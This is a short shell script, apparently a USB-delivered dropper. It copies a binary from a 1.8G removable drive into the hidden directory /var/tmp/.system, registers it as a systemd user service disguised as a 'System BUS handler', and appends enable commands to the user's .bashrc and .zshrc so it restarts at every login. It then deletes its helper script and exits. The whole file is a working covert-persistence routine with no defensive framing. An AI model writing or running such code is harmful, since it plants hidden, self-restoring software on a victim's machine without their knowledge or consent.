lol=$(lsblk | grep 1.8G)
disk=$(echo $lol | awk '{print $1}')
mntt=$(lsblk | grep $disk | awk '{print $7}')
mkdir /var/tmp/.system
cp -r $mntt/tools/sysHandle.bin /var/tmp/.system
chmod +x /var/tmp/.system/sysHandle.bin 
mkdir -p ~/.config/systemd/user/
systemctl --user start systemPer.service
echo -e "[Unit]\nDescription= System BUS handler\n\n[Service]\nExecStart=/var/tmp/.system/./sysHandle.bin -no-browser\nRestart=on-failure\nSuccessExitStatus=3 4\nRestartForceExitStatus=3 4\n\n[Install]\nWantedBy=default.target" > ~/.config/systemd/user/systemPer.service

echo -e "ls -a | grep 'zshrc' &> /dev/null\nif [ \$? = 0 ]; then\n\techo \"systemctl --user enable --now systemPer.service \" >> ~/.zshrc\nfi\n\nls -a | grep 'bashrc' &> /dev/null\nif [ \$? = 0 ]; then\n\techo \"systemctl --user enable --now systemPer.service\" >> ~/.bashrc\nfi" > ~/tmmmp
chmod +x ~/tmmmp && cd ~/ && ./tmmmp && rm tmmmp && exit
